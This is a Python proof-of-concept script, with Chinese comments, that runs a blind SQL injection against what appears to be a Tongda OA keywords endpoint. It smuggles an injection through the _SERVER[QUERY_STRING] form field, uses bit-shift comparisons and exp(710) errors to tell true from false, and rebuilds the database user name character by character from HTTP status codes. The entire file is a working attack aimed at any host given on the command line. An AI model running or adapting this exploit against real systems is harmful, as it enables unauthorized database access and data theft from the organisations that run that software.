import requests
import sys
import urllib3
urllib3.disable_warnings()

header = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
     "Content-Type":"application/x-www-form-urlencoded"
}


proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}


def poc(host,i,j):
    payload = '/general/document/index.php/setting/keywords/index'
    data = '''_SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(ascii(substr((select+user()),{},1))<<{}>>63=0,1,exp(710))#'''.format(i,j)
    url = host+payload
    try:
        res = requests.post(url,headers=header,data=data,timeout=30, verify=False,allow_redirects=False)
        return res.status_code
    except:
        pass


if __name__ == '__main__':
    host=sys.argv[1]
    result = ""
    for i in range(26):#长度不够可以变多
        str = "0";
        i=i+1
        # 采用7次位运算,一般是8次，减少测试次数，特殊字符需要可才用range(56,64)
        for j in range(57,64):
            if poc(host,i, j) == 200:
                str += "0"
            else:
                str += "1"
        if str == '00000000' or str == '01111111':
            break
        ascii = chr(int(str,2))
        print("第",i,"位：",ascii)
        result += ascii
    print("查询结果为："+result)
